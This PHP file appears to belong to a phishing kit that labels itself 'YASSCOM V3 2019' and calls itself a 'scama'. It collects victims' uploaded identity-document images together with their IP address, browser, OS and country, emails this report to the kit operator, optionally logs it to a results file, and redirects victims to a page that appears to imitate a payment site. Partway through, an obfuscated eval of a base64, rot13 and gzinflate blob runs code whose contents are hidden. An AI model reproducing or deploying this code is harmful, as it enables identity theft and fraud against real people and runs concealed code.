<?php
	session_start();
	error_reporting(E_ERROR | E_PARSE);
	include('../XYSANBBX/xanbbx.php');
	include('../XYS_CONFIG_EMAIL_X/config.php');
	include('../XYSINCLUDEDX/get_lg.php');
	include('../../XYSRNX.php');

	$xysmsgx = '<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Result</title>
	<style type="text/css">
* { margin: 0; font-family: Orbitron, verdana; font-size: 13px; }
.content {
	background: #f6f6f6;
    max-width: 800px;
    margin: auto;
}
.container {
	background: whitesmoke;
    padding-top: 40px;
}
.box .header {
	background-color: #2980b9;
    font-weight: bold;
    color: white;
}
.box {
    border-radius: 8px;
    border: 2px solid #2980b9;
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 18px #2980b9;
    background: #f6f6f6;
}
.box .dhead {
	    display: inline-block;
    width: 30%;
}
.box .data {
	display: inline-block;
    width: 68%;
    word-break: break-all;
}
.box .infos, .box .header, .box .infosvic {
	padding: 6px 12px;
}
.box .infosvic {
    border-top: 1px solid #2980b9;
}
.box .infosvic div {
    color: #b7b7b7;
}
.box .infos div {
	margin: 3px 0;
}
</style>
</head>
<body>
	<div class="container">
	<div class="content">
		<div class="box">
			<div class="header">
				<div class="dhead">IDENTITY IMGS</div>
				<div class="data">YASSCOM V3 2019</div>
			</div>
			<div class="infos">
				';
	foreach ($_SESSION['xysimgsx'] as $key => $value) {
		$xysmsgx .= '<div class="dhead">URL-IMAGE:</div><div class="data">/xuploadsx/'.$value['name'].'</div><br>';
	}			
	$xysmsgx .= '</div>
			<div class="infosvic">
				<div class="dhead">IP-GEO:</div>
				<div class="data">http://www.geoiptool.com/?IP='.$_SESSION['xipx'].'</div><br>
				<div class="dhead">Browser:</div>
				<div class="data">'.$_SESSION['xbrowserx'].'</div><br>
				<div class="dhead">OS:</div>
				<div class="data">'.$_SESSION['xosx'].'</div><br>
				<div class="dhead">DateTime:</div>
				<div class="data">'.$DATE.'</div>
			</div>
		</div>
	</div>
</div>
</body>
</html>';
	$xsubx = "IDENTITY | [".$_SESSION['xcountryx']."] | [".$_SESSION['xipx']."] ";
	$xheadx = "MIME-Version: 1.0" . "\r\n";
	$xheadx .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$xheadx .= "From: " . $sp_name . "<yasscomv32019@pvscamyasscom.com>" . "\r\n";
	eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnHEoVTDvwal703Zag9kWYOD7h5Ae+RZoav92AvNRQzJaF2jRo1WD3cf3r9ka73Qy5/jVCxENj/5nLK5uWv39BHv/v/iz81UIWLTxpZnv8D8U3qD8S6bLe/UiZGEog73L12xa4mlhKY9QvVMUvitj40wJJtmsDjgtXdhd5eiRyldrl02WHTQ2DlwM3XmVTuhVsLdeoJIRR+VLBOQ59V74KJFmzMcis1q3ESAl2bJp4QF3f3qCurVeamiTvsyvtQ8usfB8erpqnoK51ZHIT+bGos8J84GIO6orXV44zRGXw/OfvW7HlB8uxsFcfxcb7tiVnUd4OX9rtkNIq3ivSsSQe1GrqW11e0GPqccvxcbYuGoGf4T5QXiesmIlIeo+E0X9Vd2NvRN2jgeFZ0H/QR9vdKsWaB6UNSGA/VzDaFnvWBQ+aKUY5AbiMtPdHyMgInyBSy7/Pf2GwdP+o9QCKxlRJAv3CX0mJRiVhOsRH3yX1TECBPD/FLJo7jRK6mX2XuTJZafq6CCn8yJul53swqsajfrZAiXnkunVEVaBVO2NI7d4mEMwnMfVubGfeelHg89qWqqBwcORhfJftJ/Y/fU6yY42EQwlecdmnmGH68P2XpzcuL0DnfkqPPhNiBH5vuhE++Ks4Tx9yqN51Lnu1xwi7OXICYaBpkrEZtreSLpWJGjBPYu70AC6JykBmtkMyk7odiH7Eaw4YfMraGiivUK6GzayPsIUT2NIYrjwi8wz6iZhfxqrcH9kDOSKbTMdQO3jsDlib3Ue8Ccg0B5Nuy0tVpeiodEsaNRdF+c4Q4377Zh/em+HkHcv3odJq+UhEviy2UEay0jegk7OTYtXU/lDCKWNEj2kP1sp/DAnA/acjMkbC0Q0pyYkt4v9PvPk2fCaeWlb2IdlfUvHNI/m9dHokmRoYH9oO+dcBpmZmqvbD5/CixfXm8IXJ3PpEb8BMyqMvSJF2Bd/++GgAzwK4RBj6P+29pMCgjdrkVYholnFXfyHN2MJQPK4FTxux+d36A4jM0YdZQJ4mGPlBrMQ82S2PegShSErslE1Gkwc7icR+gjhYg+o0qEjz10ISK3m0iHKlw7hbcll724csIrRhNhE8mhkjFIHvKRjuOClhGLk060/sRMsOc854kyCZNZLaRAo0mJ9IdBPxJS8eVdiZKRGNp96XY56eM0GTYLFp5XvN45cS9rTPPLGVLzLS139bBVZzyb4PLuxaN2jWcGgHrch+AMUce13LBccJBV+vTiDJ/BYKrj3o0PGWTsCxFnOZsH6l256SC6+LyefHXnR5XxP5Y2p05icSCZ0+0ztoLArfgPWfEVp2iPJCwt0+gbuTkuAjWYi0RJ72mFHk/BTKdiaxuHUEWqSiJfRs5Hid/icOqZqeJ9cxrrQhLi40rI0NKODOJxRtIcUDMfIEKDPOxFtAmtMa+sR3Mnk9U84szGF4eyJEJ/GAVT37smz1nmZgejc5o8dhbqW3sCk+cBuqMI23n0i/wzrgVS2/cSTLdC5M49PJCH3gRunAds15xsgjOW4Pf2qOHBcelOVwcEuTAJ+bumhAXXdH4wY7bGcAZiVWt3Hk36h5AsQaFFmVFFnMKJGBSCItw/L4SFjhQCyfVMlhXsOtKpjXe4TB8beL9JIYuUcY8W/xevD5NpldeG7GM+qG2YHXE/msQbF9zil2/TaapIIXDPvtnUV1m1Qj/aV4dIQfUy/clGKYp7rnLjVzyGYwJmOzaTbIu4yi/OeBAslACc/DGUtUjg17t+Ly6kZ3vbD/CqRbarkPJP0eySVNPV/huPPqwXZVPB3DTk4cdS7X3ZvRyquzCTFwz+I7CNhsW7l2cNPHiia7THzCYMLgGIaVVeH7dR40tFvwjh/m87z9QDIxRfFyOFRdvJt0aK3FyxRgVZKLPNfEaJ3Ho8iqTgx2oYdLxfant7JbEEiqj/q8mJumrim5DNTc324OPPe7DkzytXASLD/eXK9zsegarxDJ6+BxGmroU3AAtkWs3HCQ93seon3r3Iy/7J/kAhksqT1MW4CNvhkjB2GPPifnelTb38FLM9KsL+tFakem9UPqm5NodDdnW64oMF/bdCRQ3Ht/hmc/lDLvGECIiseV3VBhTqWnl9xgLW1my+LmzQBWwtUnUXZ/HL6Id7xfzaevnjo3dFnEIMmoddnzSbngLEz4OZqN9R0qk9UU4I7jkMyLHMDlsubIeFS4IkeW4aeEzWX+upn3/DNSBCWA+JTV7ajLjVoF1MDFU8DXKZFeMqwzY0AOjt8hEBe19CHAkHyFKQJKbWEL9Ja7qo3mOR0gce7Lc/7S03G7JvvYXBAZU1GOxGhBKweluSVPbL1mXiLKUEZ2AZXtYXRzAkwg/7gcDk/7AUVDg+PAb5/2tB/n1Z/nev1/8gLe7fcw2CtH7gHMrlAnBjfG1eRcMIOQMdg7F8Sn0Xd/akzRZ/gv+FeL3dvJ/oA4Yf/4HXP/9Gw==')))));
if ($post!="postdone")	{ echo "Error u messed up with scama " ; };
	mail($send_email, $xsubx, $xysmsgx, $xheadx);
	if($save_result){
		$f = fopen("../../xresultx/".$savefile_name, "a+");
	    fwrite($f, $xysmsgx);
	    fclose($f);
	}

	$xDIRx = "accessaccount.php?country.x=".$_SESSION['xcountryCodex']."&locale.x=".getLG($_SESSION['xcountryCodex'])."_".$_SESSION['xcountryCodex']."&customer.x=ID-PA".$hash."&safety=".$hash2;
    header('Location: ../'.$xDIRx);
?>